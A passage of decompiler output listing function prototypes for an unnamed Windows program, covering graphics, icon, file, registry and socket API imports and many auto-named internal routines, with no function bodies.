// int __stdcall GetDeviceCaps(HDC hdc, int index);
// int __stdcall GetObjectA(HANDLE h, int c, LPVOID pv);
// HGDIOBJ __stdcall GetStockObject(int i);
// UINT __stdcall GetSystemPaletteEntries(HDC hdc, UINT iStart, UINT cEntries, LPPALETTEENTRY pPalEntries);
// BOOL __stdcall GetTextMetricsA(HDC hdc, LPTEXTMETRICA lptm);
// BOOL __stdcall MoveToEx(HDC hdc, int x, int y, LPPOINT lppt);
// UINT __stdcall RealizePalette(HDC hdc);
// HGDIOBJ __stdcall SelectObject(HDC hdc, HGDIOBJ h);
// HPALETTE __stdcall SelectPalette(HDC hdc, HPALETTE hPal, BOOL bForceBkgd);
// COLORREF __stdcall SetBkColor(HDC hdc, COLORREF color);
// int __stdcall SetBkMode(HDC hdc, int mode);
// int __stdcall SetROP2(HDC hdc, int rop2);
// COLORREF __stdcall SetTextColor(HDC hdc, COLORREF color);
// BOOL __stdcall StretchBlt(HDC hdcDest, int xDest, int yDest, int wDest, int hDest, HDC hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, DWORD rop);
// BOOL __stdcall UnrealizeObject(HGDIOBJ h);
// HICON __stdcall CreateIcon(HINSTANCE hInstance, int nWidth, int nHeight, BYTE cPlanes, BYTE cBitsPixel, const BYTE *lpbANDbits, const BYTE *lpbXORbits);
// BOOL __stdcall DestroyIcon(HICON hIcon);
// BOOL __stdcall DestroyWindow(HWND hWnd);
// BOOL __stdcall DrawIconEx(HDC hdc, int xLeft, int yTop, HICON hIcon, int cxWidth, int cyWidth, UINT istepIfAniCur, HBRUSH hbrFlickerFreeDraw, UINT diFlags);
// HDC __stdcall GetDC(HWND hWnd);
// BOOL __stdcall GetIconInfo(HICON hIcon, PICONINFO piconinfo);
// DWORD __stdcall GetSysColor(int nIndex);
// int __stdcall GetSystemMetrics(int nIndex);
// HICON __stdcall LoadIconA(HINSTANCE hInstance, LPCSTR lpIconName);
// int __stdcall LoadStringA_0(HINSTANCE hInstance, UINT uID, LPSTR lpBuffer, int cchBufferMax);
// int __stdcall MessageBoxA_0(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
// int __stdcall ReleaseDC(HWND hWnd, HDC hDC);
// LPVOID __usercall sub_405E7C@<eax>(UINT@<eax>, SIZE_T@<edx>);
// LPVOID __usercall sub_405E8C@<eax>(UINT uFlags@<ecx>, SIZE_T dwBytes@<edx>, const void *@<eax>);
// HGLOBAL __usercall sub_405EA8@<eax>(const void *@<eax>);
int sub_405EBC();
void sub_405EEC();
int sub_40618C();
void sub_4061BC();
// unsigned int __userpurge sub_406CA0@<eax>(unsigned int result@<eax>, unsigned __int16@<dx>, _WORD *@<ecx>, _WORD *);
// void __usercall sub_406CBC(__int32@<eax>);
// _DWORD *__usercall sub_406CD4@<eax>(int **@<eax>, int@<edx>, int@<ecx>);
// char *__usercall sub_406D34@<eax>(int@<eax>);
// _DWORD *__usercall sub_406D54@<eax>(_BYTE *a1@<eax>, char **a2@<edx>);
// _DWORD *__usercall sub_406D90@<eax>(_BYTE *a1@<eax>, char **a2@<edx>);
// int __usercall sub_406DCC@<eax>(_DWORD *@<eax>, _DWORD *@<edx>, unsigned int@<ecx>);
// int __usercall sub_406DEC@<eax>(_BYTE *@<eax>, _BYTE *@<edx>);
// char __usercall sub_406E40@<al>(_BYTE *@<eax>, _BYTE *@<edx>);
// int __usercall sub_406E64@<eax>(char *@<eax>, char *@<edx>);
// _DWORD *__usercall sub_406E9C@<eax>(int@<eax>, char **@<edx>);
// _DWORD *__usercall sub_406EEC@<eax>(int@<eax>, char **@<edx>);
// volatile __int32 *__usercall sub_406F20@<eax>(unsigned __int8 *a1@<eax>, volatile __int32 *a2@<edx>);
// _DWORD *__usercall sub_406FEC@<eax>(int@<eax>, char **@<edx>);
// _DWORD *__usercall sub_40701C@<eax>(int@<eax>, int@<edx>, char **@<ecx>);
// int __usercall sub_407058@<eax>(int@<eax>, int@<edx>, char *@<ecx>);
// HANDLE __usercall sub_407070@<eax>(char *@<eax>, char@<dl>);
// HANDLE __usercall sub_4070B0@<eax>(char *@<eax>);
// DWORD __usercall sub_4070D4@<eax>(DWORD nNumberOfBytesToRead@<ecx>, LPVOID lpBuffer@<edx>, void *@<eax>);
// DWORD __usercall sub_407100@<eax>(DWORD nNumberOfBytesToWrite@<ecx>, LPCVOID lpBuffer@<edx>, void *@<eax>);
// DWORD __usercall sub_40712C@<eax>(DWORD dwMoveMethod@<ecx>, LONG lDistanceToMove@<edx>, void *@<eax>);
// BOOL __usercall sub_407138@<eax>(void *@<eax>);
// int __usercall sub_407140@<eax>(char *@<eax>);
// bool __usercall sub_4071A8@<al>(char *@<eax>);
// DWORD __usercall sub_4071B8@<eax>(char *@<eax>, DWORD@<edx>);
// DWORD __usercall sub_4071E0@<eax>(int@<eax>);
// DWORD __usercall sub_407244@<eax>(char *@<eax>, char@<dl>, int@<ecx>);
// DWORD __usercall sub_407294@<eax>(int@<eax>);
// void *__usercall sub_4072B8@<eax>(int@<eax>);
// int __usercall sub_4072D4@<eax>(char *@<eax>, char *@<edx>);
// _DWORD *__usercall sub_407324@<eax>(char *@<eax>, char *@<edx>, volatile __int32 *@<ecx>);
// _DWORD *__usercall sub_4073B8@<eax>(char *@<eax>, char **@<edx>);
// _DWORD *__usercall sub_4073EC@<eax>(char *@<eax>, char **@<edx>);
// _DWORD *__usercall sub_407424@<eax>(char *@<eax>, char **@<edx>);
BOOL __stdcall sub_40745C(LPCSTR lpRootPathName, int, int, int);
// int __usercall sub_4074D0@<eax>(char@<al>, int@<edx>, int@<ecx>);
// __int64 __usercall sub_407500@<edx:eax>(char@<al>);
// unsigned int __usercall sub_407534@<eax>(const char *@<eax>);
// char *__usercall sub_40754C@<eax>(char *result@<eax>, char *@<edx>, unsigned int@<ecx>);
// char *__usercall sub_407588@<eax>(char *result@<eax>, _BYTE *@<edx>, int@<ecx>);
// char *__usercall sub_4075BC@<eax>(char *@<eax>, char *@<edx>);
// int __usercall sub_4075E0@<eax>(_BYTE *@<eax>, _BYTE *@<edx>, int@<ecx>);
// _BYTE *__usercall sub_407628@<eax>(_BYTE *@<eax>, unsigned __int8@<dl>);
// _DWORD *__usercall sub_407648@<eax>(int@<eax>);
// char *__usercall sub_40765C@<eax>(char *@<eax>);
// _DWORD *__usercall sub_407688@<eax>(int@<eax>, unsigned __int8 *@<edx>, unsigned int@<ecx>);
// volatile __int32 *__usercall sub_4076E0@<eax>(volatile __int32 *@<eax>, VARIANTARG *@<edx>);
// _DWORD *__usercall sub_4076F4@<eax>(_DWORD *@<eax>);
// void __userpurge sub_407700(unsigned __int8 *a1@<eax>, unsigned int a2@<edx>, unsigned __int8 *a3@<ecx>, int a4, int a5, int a6);
// unsigned __int8 __usercall sub_4077E2@<al>(unsigned __int8 result@<al>, unsigned __int8 *@<ecx>, int@<ebp>, unsigned __int8 *@<esi>);
// char __usercall sub_40782B@<al>(char@<al>, int@<ebp>, int (*)()@<esi>);
// int __usercall sub_4078EB@<eax>(int@<ebx>, int@<ebp>);
// unsigned int __usercall sub_407972@<eax>(unsigned int result@<eax>, int@<ebp>);
// void __usercall sub_407ADD(int a1@<ebp>);
// unsigned __int8 *__userpurge sub_407AF8@<eax>(unsigned __int8 *a1@<eax>, unsigned int a2@<edx>, char *a3@<ecx>, int a4, int a5);
// _DWORD *__userpurge sub_407B2C@<eax>(unsigned __int8 *@<eax>, int@<edx>, int@<ecx>, char **);
// _DWORD *__userpurge sub_407B40@<eax>(char **@<eax>, unsigned __int8 *@<edx>, int@<ecx>, int);
// int __userpurge sub_407C08@<eax>(_DWORD *@<eax>, double);
// char __userpurge sub_407C48@<al>(unsigned __int16@<ax>, unsigned __int16@<dx>, unsigned __int16@<cx>, double *, unsigned __int16);
// double __userpurge sub_407CB8@<st0>(unsigned __int16@<ax>, unsigned __int16@<dx>, unsigned __int16@<cx>, unsigned __int16);
// unsigned int __userpurge sub_407D30@<eax>(_WORD *@<eax>, _WORD *@<edx>, _WORD *@<ecx>, int, double);
// bool __usercall sub_407D8C@<al>(unsigned __int16@<ax>);
// char __userpurge sub_407DC8@<al>(unsigned __int16@<ax>, unsigned __int16@<dx>, unsigned __int16@<cx>, double *);
// double __usercall sub_407E90@<st0>(unsigned __int16@<ax>, unsigned __int16@<dx>, unsigned __int16@<cx>);
// _WORD *__userpurge sub_407F04@<eax>(unsigned __int16 *@<eax>, _WORD *@<edx>, _WORD *@<ecx>, int, double);
// _WORD *__userpurge sub_408048@<eax>(unsigned __int16 *@<eax>, _WORD *@<edx>, _WORD *@<ecx>, double);
int __stdcall sub_408068(double); // idb
double sub_408090();
// int __usercall sub_4080E0@<eax>(char *@<eax>, int@<edx>, int);
// int __usercall sub_408124@<eax>(char *@<eax>, int);
// int __usercall sub_408144@<eax>(int@<eax>, int@<edx>, int);
int __cdecl sub_408190(int);
int __cdecl sub_4081BC(int);
int __cdecl sub_4081F4(int);
// _DWORD *__usercall sub_408234@<eax>(int@<eax>, char **@<edx>, int);
// _DWORD *__usercall sub_4083A0@<eax>(int@<eax>, char **@<edx>, int);
// int __usercall sub_4084A8@<eax>(char *@<eax>, int);
// _DWORD *__userpurge sub_408C1C@<eax>(char **@<eax>, char *@<edx>, int, int);
// _DWORD *__userpurge sub_408C78@<eax>(char **@<eax>, int, int);
// _DWORD *__userpurge sub_408C8C@<eax>(char *@<eax>, char **@<edx>, int, int);
// _DWORD *__usercall sub_408CA0@<eax>(DWORD@<eax>, char **@<edx>);
// volatile __int32 *__userpurge sub_408CEC@<eax>(LCID@<eax>, LCTYPE@<edx>, __int32@<ecx>, volatile __int32 *);
// int __usercall sub_408D38@<eax>(LCID@<eax>, LCTYPE@<edx>, int@<ecx>);
// int **__userpurge sub_408D60@<eax>(LCTYPE@<eax>, int@<edx>, int@<ecx>, volatile __int32 *, int, int);
// int __usercall sub_408D9C@<eax>(int@<ebx>, int@<edi>, int@<esi>);
BOOL __stdcall CalInfoEnumProc(LPSTR); // idb
BOOL __stdcall sub_408EFC(LPSTR); // idb
_DWORD *sub_408F74();
// int __usercall sub_409024@<eax>(int@<eax>, char **@<edx>, int@<ebx>, int@<edi>, int@<esi>);
// int __usercall sub_409244@<eax>(int result@<eax>);
// unsigned int __userpurge sub_409250@<eax>(int@<eax>, const void *@<edx>, const char *@<ecx>, unsigned int);
// void __usercall sub_4093D8(int a1@<eax>, const void *a2@<edx>);
// _DWORD *__usercall sub_409450@<eax>(int@<eax>, char@<dl>, __int32@<ecx>);
// int __userpurge sub_40948C@<eax>(int@<eax>, char@<dl>, unsigned __int8 *ecx0@<ecx>, int, int);
// _DWORD *__usercall sub_40950C@<eax>(int@<eax>, char@<dl>, int **@<ecx>);
// int __userpurge sub_409548@<eax>(int@<eax>, char@<dl>, int **@<ecx>, int, int);
// int __usercall sub_4095DC@<eax>(int result@<eax>);
_DWORD *sub_409608();
// void __userpurge sub_409688(int@<eax>, DWORD, DWORD, DWORD, const ULONG_PTR *);
// int __usercall sub_4096CC@<eax>(__int32@<eax>, int@<edx>, int@<ecx>);
void __stdcall sub_409778(DWORD, DWORD, DWORD, const ULONG_PTR *);
// void __userpurge sub_409788(__int32@<eax>, int@<edx>, int@<ecx>, int);
int sub_4097A4();
// char __usercall sub_4097D0@<al>(int *@<eax>);
// int __usercall sub_409850@<eax>(int *@<eax>);
int __cdecl sub_409864(int);
// int *__usercall sub_409A30@<eax>(int *@<eax>);
// void __usercall __noreturn sub_409AFC(int@<eax>, const void *@<edx>);
int sub_409B0C();
void *sub_409BD8();
_DWORD *sub_409C44();
// int __usercall sub_409C9C@<eax>(unsigned __int8 *@<eax>, int@<edx>);
// int __usercall sub_409D14@<eax>(char *@<eax>, int@<edx>);
// int __usercall sub_409D38@<eax>(unsigned __int8 *@<eax>, int@<edx>);
// int __usercall sub_409D50@<eax>(int@<eax>, int@<edx>);
// int __usercall sub_409D78@<eax>(int@<eax>, int@<edx>);
// int __userpurge sub_409DC8@<eax>(int@<eax>, int@<edx>, int *@<ecx>, int *);
// __int64 __usercall sub_409E3C@<edx:eax>(int@<eax>, int@<edx>);
// __int64 __usercall sub_409EA0@<edx:eax>(int@<eax>, int@<edx>);
// _BYTE *__usercall sub_409F00@<eax>(unsigned __int8 *@<eax>, unsigned __int8@<dl>);
// _BYTE *__usercall sub_409F28@<eax>(unsigned __int8 *@<eax>, unsigned __int8@<dl>);
char sub_409F68();
// int __usercall sub_40A020@<eax>(int@<ebx>, int@<edi>, int@<esi>);
_DWORD *sub_40A398();
// int __usercall sub_40A430@<eax>(int@<eax>);
int sub_40A440();
HMODULE sub_40A460();
// _DWORD *__usercall sub_40A4BC@<eax>(_DWORD *@<eax>, char@<dl>);
// void __usercall sub_40A524(_DWORD *@<eax>, char@<dl>);
// bool __usercall sub_40A564@<al>(int@<eax>);
// void __usercall sub_40A5A0(int@<eax>);
// _DWORD *__usercall sub_40A5EC@<eax>(_DWORD **@<eax>);
// int __userpurge sub_40A8E8@<eax>(_BYTE *a1@<eax>, int a2@<edx>, char a3@<cl>, int a4, int a5, unsigned __int8 a6);
// int __userpurge sub_40A8EE@<eax>(_BYTE *@<eax>, int@<edx>, char@<cl>, int, int, unsigned __int8);
// char __usercall sub_40A9A3@<al>(char *@<esi>);
// char __usercall sub_40A9AC@<al>(int@<ebp>, _BYTE *@<edi>);
// char __usercall sub_40A9B6@<al>(int@<ebp>, _BYTE *@<edi>, char *@<esi>);
// int __usercall sub_40AA18@<eax>(int@<ebp>, _BYTE *@<edi>, char *@<esi>);
// int __usercall sub_40AA4C@<eax>(__int16@<ax>, int@<edx>, int@<ecx>, char@<bl>, _BYTE *@<edi>);
// char __usercall sub_40AA90@<al>(int@<ebp>, char *@<edi>, char *@<esi>);
// void __usercall sub_40AAF1(int@<ebp>, _BYTE *@<edi>, char *@<esi>);
// void __usercall sub_40AB48(void *@<edi>);
// _BYTE *__userpurge sub_40AB5A@<eax>(int@<eax>, int@<edx>, _BYTE *@<ecx>, int@<ebp>, char *@<esi>, int);
// char __usercall sub_40AC8A@<al>(int@<ecx>, int@<ebp>);
// int __usercall sub_40ACC5@<eax>(int@<ebp>, char *@<esi>);
// _BYTE *__usercall sub_40AD70@<eax>(int@<ebp>);
// char __usercall sub_40AE2B@<al>(_BYTE *@<ebx>, int@<ebp>, _BYTE *@<edi>);
// char __usercall sub_40AE4C@<al>(_BYTE *@<ebx>, int@<ebp>, _BYTE *@<edi>);
// _BYTE *__userpurge sub_40AE91@<eax>(int@<eax>, int@<edx>, char@<cl>, int, int);
// int __usercall sub_40AEB8@<eax>(int@<ebx>, int@<ebp>, int@<esi>);
// _BYTE *__usercall sub_40AFBF@<eax>(int@<ebx>, int@<ebp>, int@<esi>);
// char __usercall sub_40B13B@<al>(char *@<esi>);
// double __usercall sub_40B146@<st0>(int@<ebp>, char *@<esi>, double result@<st0>);
// char __usercall sub_40B162@<al>(_BYTE *@<esi>);
int sub_40B194();
// int __usercall sub_40B2D4@<eax>(int@<ebx>, int@<edi>, int@<esi>);
int sub_40B354();
void sub_40B384();
int sub_40B38C();
void sub_40B3BC();
int sub_40B474();
void sub_40B4A4();
int sub_40B4D8();
void sub_40B528();
// void __usercall sub_40BEA8(PVOID@<eax>);
// _DWORD *__userpurge sub_40BFC8@<eax>(_DWORD *result@<eax>, char@<dl>, int@<ecx>, int, int);
// void __usercall sub_40C000(int@<eax>, int@<edx>, int@<ecx>);
// char __userpurge sub_40C02C@<al>(_BYTE *@<eax>, _DWORD *@<edx>, int@<ecx>, int);
// char __userpurge sub_40C06C@<al>(int@<eax>, volatile __int32 *@<edx>, _DWORD *@<ecx>, int);
// int __usercall sub_40C0B0@<eax>(_DWORD *@<eax>, char@<dl>);
// int __usercall sub_40C0D0@<eax>(_DWORD *@<eax>, int@<edx>);
// _DWORD *__usercall sub_40C104@<eax>(_DWORD *@<eax>);
// int __usercall sub_40C11C@<eax>(_DWORD *@<eax>, int@<edx>);
// int __usercall sub_40C17C@<eax>(int@<ebp>);
// void __userpurge sub_40C180(unsigned __int8 *@<edx>, int@<ecx>, int@<ebx>, int@<ebp>, int@<esi>, DWORD, DWORD, DWORD, const ULONG_PTR *);
_DWORD *__fastcall sub_40C1B8(int, int **);
// int __usercall sub_40C20C@<eax>(int@<eax>, int@<edx>);
// int __usercall sub_40C268@<eax>(int@<eax>, int@<edx>);
// int __usercall sub_40C288@<eax>(_DWORD *@<eax>, int@<edx>);
// _DWORD *__usercall sub_40C2A8@<eax>(_DWORD *result@<eax>, int@<edx>);
// __int16 __usercall sub_40C2E4@<ax>(_DWORD *@<eax>, int@<edx>);
// _DWORD *__usercall sub_40C358@<eax>(_DWORD *@<eax>, char@<dl>);
// void __usercall sub_40C3AC(_DWORD *@<eax>, char@<dl>);
int __cdecl sub_40C40E(int, ULONG_PTR);
// void __usercall sub_40C428(int@<eax>, int@<edx>);
// int __usercall sub_40C4B0@<eax>(int@<eax>);
// void __usercall sub_40C4C4(int@<eax>, int@<edx>);
// void __usercall sub_40C514(int@<eax>);
// _DWORD *__usercall sub_40C520@<eax>(_DWORD *@<eax>, char@<dl>);
// _DWORD *__usercall sub_40C54C@<eax>(int *@<eax>, int (***)(void)@<edx>);
// _DWORD *__usercall sub_40C560@<eax>(int *@<eax>, int *@<edx>);
// _DWORD *__usercall sub_40C63C@<eax>(int *@<eax>, char **@<edx>);
// _DWORD *__usercall sub_40C6F0@<eax>(_DWORD *@<eax>, char@<dl>);
// int __usercall sub_40C720@<eax>(int@<eax>, int@<edx>);
// int __usercall sub_40C744@<eax>(int@<eax>, int@<ecx>);
// _DWORD *__usercall sub_40C768@<eax>(_DWORD *@<eax>, int@<edx>);
// _DWORD *__usercall sub_40C820@<eax>(int *@<eax>, int (***)(void)@<edx>);
// _DWORD *__usercall sub_40C890@<eax>(_DWORD *result@<eax>);
// int __usercall sub_40C8A8@<eax>(int@<ebx>, int);
// int __usercall sub_40C900@<eax>(int@<eax>, int@<edx>, int@<ebx>);
// _DWORD *__usercall sub_40C94C@<eax>(_DWORD *result@<eax>);
// char __usercall sub_40C960@<al>(int@<eax>, int@<edx>);
// int __usercall sub_40CA08@<eax>(int@<ebp>);
// void __userpurge sub_40CA0C(unsigned __int8 *@<edx>, int@<ecx>, int@<ebx>, int@<ebp>, int@<esi>, DWORD, DWORD, DWORD, const ULONG_PTR *);
// _DWORD *__usercall sub_40CA44@<eax>(int@<eax>, int **@<edx>, int@<ecx>);
// int __usercall sub_40CA9C@<eax>(_DWORD *@<eax>, int@<edx>, int@<ecx>);
// int __usercall sub_40CB84@<eax>(int@<eax>);
int sub_40CB8C();
// char *__usercall sub_40CB90@<eax>(int@<eax>);
// int __usercall sub_40CBE4@<eax>(int@<eax>, char **@<edx>);
// int __usercall sub_40CCCC@<eax>(int@<eax>, char *@<edx>);
// int __userpurge sub_40CD4C@<eax>(int@<eax>, int@<edx>, int@<ecx>, int);
// _DWORD *__usercall sub_40CD7C@<eax>(int@<eax>, char *@<edx>);
// _DWORD *__usercall sub_40CDD0@<eax>(_DWORD *@<eax>, int@<edx>);
// _DWORD *__usercall sub_40CE7C@<eax>(_DWORD *@<eax>, int@<edx>, int@<ecx>);
// int __usercall sub_40CF2C@<eax>(int@<eax>, int@<edx>, int@<ecx>);
// _DWORD *__usercall sub_40CF60@<eax>(_DWORD *@<eax>, _DWORD *@<edx>);
// _DWORD *__usercall sub_40D010@<eax>(int@<eax>, char *@<edx>);
// _DWORD *__usercall sub_40D068@<eax>(int@<eax>, int@<edx>, int@<esi>);
// int *__usercall sub_40D0C8@<eax>(int@<eax>, int@<edx>);
// _DWORD *__usercall sub_40D0FC@<eax>(int@<eax>, char *@<edx>);
// _DWORD *__usercall sub_40D14C@<eax>(_DWORD *@<eax>, char *@<edx>);
// _DWORD *__usercall sub_40D210@<eax>(int@<eax>, int *@<edx>);
// int __usercall sub_40D294@<eax>(_DWORD *@<eax>, char@<dl>);
// int __usercall sub_40D2F0@<eax>(int@<eax>, __int32@<edx>, int@<ecx>);
// int __usercall sub_40D348@<eax>(int result@<eax>, int@<ecx>);
// int __usercall sub_40D364@<eax>(int result@<eax>, int@<ecx>);
// _DWORD *__usercall sub_40D380@<eax>(_DWORD *result@<eax>);
// int __usercall sub_40D3B8@<eax>(_DWORD *@<eax>, int@<edx>);
// int __usercall sub_40D41C@<eax>(_DWORD *@<eax>, int@<edx>, int@<ecx>);
// int *__usercall sub_40D474@<eax>(int@<eax>, int@<edx>, int@<ecx>);
// char __usercall sub_40D498@<al>(int@<eax>, char *@<edx>, signed int *@<ecx>);
// volatile __int32 *__usercall sub_40D500@<eax>(int@<eax>, int@<edx>, volatile __int32 *@<ecx>);
// int __usercall sub_40D534@<eax>(int@<eax>);
// int __usercall sub_40D538@<eax>(int@<eax>);
// int __usercall sub_40D53C@<eax>(int@<eax>, int@<edx>);
// int __usercall sub_40D564@<eax>(int@<eax>);
// int __usercall sub_40D598@<eax>(_BYTE *@<eax>, char *@<edx>, int@<ecx>);
// int __usercall sub_40D5D0@<eax>(int@<eax>, int@<edx>, __int32@<ecx>);
// int __usercall sub_40D618@<eax>(_DWORD *@<eax>, int@<edx>, __int32@<ecx>);
// int __usercall sub_40D680@<eax>(int@<eax>, int@<edx>, __int32@<ecx>);
// int __usercall sub_40D6D8@<eax>(_DWORD *@<eax>, int@<edx>, int@<ecx>);
// int *__userpurge sub_40D714@<eax>(int@<eax>, int@<edx>, int@<ecx>, int (__fastcall *)(unsigned int, int));
// _DWORD *__usercall sub_40D7A8@<eax>(int@<eax>, int@<edx>);
// int __usercall sub_40D7C4@<eax>(int@<eax>, char@<dl>);
// int __usercall sub_40D7D4@<eax>(int@<eax>, int@<edx>, int@<ecx>);
// int __usercall sub_40D7EC@<eax>(int@<eax>);
// int __usercall sub_40D7FC@<eax>(int result@<eax>, int (__fastcall *)(unsigned int, int)@<edx>);
// int __usercall sub_40D830@<eax>(int@<eax>);
// int __usercall sub_40D840@<eax>(int@<eax>);
// int __usercall sub_40D84C@<eax>(int@<eax>);
// void __usercall sub_40D884(int@<eax>, int@<edx>, int@<ecx>);
// void __usercall sub_40D8BC(int@<eax>, int@<edx>, int@<ecx>);
// DWORD __usercall sub_40D8F4@<eax>(int@<eax>, void *@<edx>, DWORD@<ecx>);
// DWORD __usercall sub_40D904@<eax>(int@<eax>, const void *@<edx>, DWORD@<ecx>);
// DWORD __usercall sub_40D914@<eax>(int@<eax>, LONG@<edx>, unsigned __int16@<cx>);
// int __usercall sub_40D920@<eax>(HANDLE *@<eax>);
// _DWORD *__userpurge sub_40D940@<eax>(_DWORD *a1@<eax>, char a2@<dl>, char *a3@<ecx>, __int16 a4);
// void *__usercall sub_40D9F8@<eax>(_DWORD *@<eax>, char@<dl>);
// int __usercall sub_40DA20@<eax>(int result@<eax>, int@<edx>, int@<ecx>);
// int __usercall sub_40DA28@<eax>(_DWORD *@<eax>, char *@<edx>, int@<ecx>);
// int __usercall sub_40DA60@<eax>(int@<eax>, int@<edx>, __int16@<cx>);
// _DWORD *__usercall sub_40DA84@<eax>(_DWORD *@<eax>, char@<dl>);
// int __usercall sub_40DAB0@<eax>(int *@<eax>);
// void __usercall sub_40DAC8(int@<eax>, int@<edx>);
// _DWORD *__usercall sub_40DB00@<eax>(int@<eax>, char *@<edx>);
// int __usercall sub_40DB54@<eax>(int *@<eax>);
// int __usercall sub_40DB7C@<eax>(int *@<eax>, int@<edx>);
_DWORD sub_40DBA8(); // weak
// int __usercall sub_40DC2C@<eax>(int *@<eax>, char *@<edx>, int@<ecx>);
// void __usercall sub_40DC7C(int@<eax>, _BYTE *@<edx>);
// void __usercall sub_40DD28(int@<eax>);
// void __usercall sub_40DDAC(int **@<eax>);
void sub_40DDC4();
// void __usercall sub_40DDD0(_DWORD *@<eax>, char@<dl>, int@<ecx>);
// bool __usercall sub_40DDF4@<al>(_DWORD *@<eax>, int@<ecx>);
// __int64 __usercall sub_40DE08@<edx:eax>(_DWORD *@<eax>, int@<ecx>);
// _DWORD *__usercall sub_40DE18@<eax>(_DWORD *result@<eax>, char *@<edx>, unsigned int@<ecx>);
// int __usercall sub_40DE64@<eax>(int@<eax>);
// void __usercall sub_40DEA0(_DWORD *@<eax>, int@<ecx>);
// void __usercall sub_40DEA8(void *this@<ecx>, _DWORD *@<eax>);
// _DWORD *__usercall sub_40DEB0@<eax>(_DWORD *@<eax>, char **@<edx>, int@<ecx>);
// _DWORD *__usercall sub_40DEEC@<eax>(_DWORD *@<eax>, char **@<edx>, int@<ecx>);
// __int64 __usercall sub_40DF4C@<edx:eax>(_DWORD *@<eax>, int@<ecx>);
// _DWORD *__usercall sub_40DF60@<eax>(_DWORD *@<eax>, int@<ecx>);
void __cdecl sub_40DFA8(int);
// _DWORD *__usercall sub_40DFD0@<eax>(_DWORD *result@<eax>, int);
_DWORD *__cdecl sub_40E024(int);
void __cdecl sub_40E04C(int);
// _DWORD *__usercall sub_40E0AC@<eax>(_DWORD *@<eax>, int@<ecx>);
// _DWORD *__usercall sub_40E214@<eax>(_DWORD *@<eax>, int@<ecx>);
// int *__usercall sub_40E25C@<eax>(int *result@<eax>, char *@<edx>, unsigned int@<ecx>);
// int __usercall sub_40E2A8@<eax>(int *@<eax>);
// int *__usercall sub_40E2C0@<eax>(int *@<eax>, int@<ecx>);
// int *__usercall sub_40E2C8@<eax>(int *@<eax>, int@<ecx>);
// int *__usercall sub_40E2D0@<eax>(int *@<eax>, char *@<edx>);
// int *__usercall sub_40E32C@<eax>(int *@<eax>, char@<dl>, int@<ecx>);
int sub_40E340();
_DWORD *sub_40E35C();
// void __usercall sub_40E3C8(void *@<eax>);
int sub_40E3D0();
void sub_40E488();
int sub_40E514();
void sub_40E55C();
// int __usercall sub_40E62C@<eax>(DWORD@<eax>);
// bool __usercall sub_40E658@<al>(_BYTE *@<eax>);
// int __usercall sub_40E66C@<eax>(char@<al>);
// char __usercall sub_40E69C@<al>(int@<eax>);
// int __usercall sub_40E6C4@<eax>(int@<eax>, char@<dl>);
// _DWORD *__usercall sub_40E708@<eax>(_DWORD *@<eax>, char@<dl>);
// HKEY __usercall sub_40E734@<eax>(int@<eax>);
// HKEY __usercall sub_40E764@<eax>(int@<eax>, HKEY@<edx>);
// volatile __int32 *__usercall sub_40E790@<eax>(int@<eax>, int@<edx>, __int32@<ecx>);
// int __usercall sub_40E7B4@<eax>(int@<eax>, char@<dl>);
// bool __usercall sub_40E7C8@<al>(int@<eax>, __int32@<edx>, char@<cl>);
// int __usercall sub_40E8EC@<eax>(int@<eax>, char *@<edx>, DWORD@<ecx>, int@<ebx>);
// int __usercall sub_40E93C@<eax>(int@<eax>, char *@<edx>);
// void __usercall sub_40E964(int@<eax>, char *@<edx>, char *@<ecx>);
// _DWORD *__usercall sub_40E990@<eax>(int@<eax>, char *@<edx>, char **@<ecx>);
// void __userpurge sub_40EA08(int@<eax>, char *@<edx>, BYTE *@<ecx>, char, DWORD cbData);
// DWORD __userpurge sub_40EA70@<eax>(LPBYTE lpData@<ecx>, int@<eax>, char *@<edx>, int, DWORD cbData);
// int __usercall sub_40EAE4@<eax>(int@<eax>, char *@<edx>, int@<ebx>);
int sub_40EB0C();
void sub_40EB54();
// HICON __stdcall ExtractIconA(HINSTANCE hInst, LPCSTR pszExeFileName, UINT nIconIndex);
int sub_40EB64();
void sub_40EB94();
// _WORD *__userpurge sub_40EB9C@<eax>(_WORD *result@<eax>, _WORD *@<ecx>, int);
// _WORD *__usercall sub_40EBC4@<eax>(char@<al>, _WORD *@<edx>, int@<ecx>);
// _DWORD *__userpurge sub_40EDA4@<eax>(int@<eax>, char@<dl>, char@<cl>, char **);
int sub_40EEAC();
// volatile __int32 *__usercall sub_40EF00@<eax>(char@<al>, volatile __int32 *@<edx>);
// char __usercall sub_40F230@<al>(int@<eax>, char@<dl>, signed __int32@<ecx>);
int sub_40F348();
void sub_40F378();
// int __usercall sub_40F3B4@<eax>(int@<eax>, char **@<edx>);
// _DWORD *__usercall sub_40F4CC@<eax>(int@<eax>, char **@<edx>);
int sub_40F654();
void sub_40F684();
// int __usercall sub_40F6B4@<eax>(int result@<eax>, int *@<edx>);
// _DWORD *__usercall sub_40F6C4@<eax>(_DWORD *result@<eax>);
// int __stdcall closesocket(SOCKET s);
// int __stdcall connect(SOCKET s, const struct sockaddr *name, int namelen);
// int __stdcall getpeername(SOCKET s, struct sockaddr *name, int *namelen);
// int __stdcall getsockname(SOCKET s, struct sockaddr *name, int *namelen);
// u_short __stdcall htons(u_short hostshort);
// unsigned int __stdcall inet_addr(const char *cp);
// int __stdcall ioctlsocket(SOCKET s, int cmd, u_long *argp);
// int __stdcall recv(SOCKET s, char *buf, int len, int flags);
// int __stdcall select(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, const struct timeval *timeout);
// int __stdcall send(SOCKET s, const char *buf, int len, int flags);
// SOCKET __stdcall socket(int af, int type, int protocol);
// struct hostent *__stdcall gethostbyname(const char *name);
// struct protoent *__stdcall getprotobynumber(int number);
// struct servent *__stdcall getservbyname(const char *name, const char *proto);
// int __stdcall gethostname(char *name, int namelen);
// int __stdcall WSAGetLastError();
// int __stdcall WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData);
int sub_40F754();
void sub_40F784();
// _DWORD *__usercall sub_40F908@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// _DWORD *__usercall sub_40F96C@<eax>(_DWORD *@<eax>, char@<dl>);
// _DWORD *__userpurge sub_40F998@<eax>(int@<eax>, int@<edx>, char *@<ecx>, char *);
// _DWORD *__usercall sub_40FAA4@<eax>(int@<eax>);
// int __usercall sub_40FAC8@<eax>(int@<eax>);
